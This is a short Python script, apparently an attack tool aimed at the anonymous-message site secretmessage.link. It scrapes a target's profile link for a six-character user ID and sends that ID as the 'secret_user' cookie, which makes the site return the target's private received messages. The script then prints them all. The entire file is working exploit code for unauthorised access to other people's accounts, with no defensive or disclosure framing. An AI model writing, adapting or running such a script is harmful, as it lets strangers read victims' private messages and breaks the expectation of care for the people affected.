import requests
from bs4 import BeautifulSoup

link = input("Target Link: > ")
getUID = requests.get(link)
raw_html = getUID.text

soup = BeautifulSoup(raw_html, 'html.parser')
targetName = soup.title.string
print(targetName)

uid = soup.find(rel="shortlink").get('href')[-6:]

print(f"[+] Target UID: {uid}")
print("Getting Messages.....")

getMsg = requests.get('https://www.secretmessage.link/', cookies = {'secret_user': uid})
baked_html = getMsg.text

soup1 = BeautifulSoup(baked_html, 'html.parser')
msgRaw = soup1.find_all("p", {"class": "secret-received-message"})
msgCount = len(msgRaw)
print(f"[+] Discovered {msgCount} Secret Messages")
print("")

for x in msgRaw:
	index = msgRaw.index(x) + 1
	print(f"({index}) " + x.string.strip())